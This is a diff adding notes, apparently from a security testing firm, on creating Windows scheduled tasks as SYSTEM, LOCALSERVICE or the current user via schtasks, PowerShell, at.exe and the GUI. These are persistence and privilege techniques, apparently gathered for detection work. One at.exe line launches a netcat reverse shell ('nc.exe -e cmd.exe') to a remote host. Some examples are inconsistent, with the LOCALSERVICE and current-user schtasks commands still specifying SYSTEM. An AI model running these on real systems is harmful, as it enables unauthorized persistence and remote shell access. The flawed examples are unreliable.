@@ -1,0 +1,70 @@
+
+Schedule Windows Task via Schtasks.exe Command
+
+Note: To admin localservice and localsystem task  local administrative privileges are typically required.
+
+1. Create scheduled task as localsystem:
+
+schtasks.exe /ru "SYSTEM" /Create /SC DAILY /MO "7" /ST "12:00" /TN "netspi-task-localsystem " /TR "cmd.exe" 
+
+2. Create scheduled task as localservice:
+
+schtasks.exe /ru "SYSTEM" /Create /SC DAILY /MO "7" /ST "12:00" /TN "netspi-task-localservice" /TR "cmd.exe" 
+
+3: Create schedule task as current user:
+
+schtasks.exe /ru "SYSTEM" /Create /SC DAILY /MO "7" /ST "12:00" /TN "netspi-task-user" /TR "cmd.exe" 
+
+Note: This can also be used to schedule tasks on remote systems as shown below.
+
+schtasks.exe /s SRV01 /ru "SYSTEM" /Create /SC DAILY /MO "7" /ST "12:00" /TN "netspi-task-localsystem " /TR "cmd.exe" 
+
+
+Schedule Windows Task via PowerShell Command
+
+Note: To admin localservice and localsystem task  local administrative privileges are typically required.
+
+1. Create scheduled task as localsystem:
+
+$a = New-ScheduledTaskAction -Execute "Cmd"
+$p = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
+Register-ScheduledTask netspi-task-localsystem -Action $a -Principal $p 
+
+2. Create scheduled task as localservice:
+
+$a = New-ScheduledTaskAction -Execute "Cmd"
+$p = New-ScheduledTaskPrincipal -UserId "LOCALSERVICE" -LogonType ServiceAccount
+Register-ScheduledTask netspi-task-localservice -Action $a -Principal $p 
+
+3: Create schedule task as current user:
+
+$a = New-ScheduledTaskAction -Execute "Cmd"
+$p = New-ScheduledTaskPrincipal -UserId $env:username -LogonType ServiceAccount
+Register-ScheduledTask netspi-task-currentuser -Action $a -Principal $p 
+
+Tip: This can also be condensed into one line like so:
+
+Register-ScheduledTask netspi-task-localsystem -Action (New-ScheduledTaskAction -Execute "Cmd") -Principal (New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount)
+
+
+Schedule Windows Task via At.exe Command
+Note: Only run this one as a local administrator or system.
+
+1. Local Example:
+
+at 15:25 /interactive "cmd.exe"
+
+2. Remote Example:
+
+at \\192.168.1.252\ 7:09pm /interactive "c:\nc.exe -e cmd.exe" 127.0.0.1 53
+
+
+Note: Still need event ids for PowerShell and At.exe.
+
+Schedule Windows Task via GUI
+
+1.Go to Start > Administrative Tools > Task Scheduler
+2.In the Task Scheduler window click "Create Task" on the right hand bar under the "Actions" pane
+3.In the "Create Task" dialog click the "Change User or Group" button
+4.Make sure "From this location" is set to the local machine name (to change click "Locations" button and select the local computer name)
+5.Type "SYSTEM" in the text box and press ok . Under "When running the task, use the following user account:" you should see "NT AUTHORITY\SYSTEM".
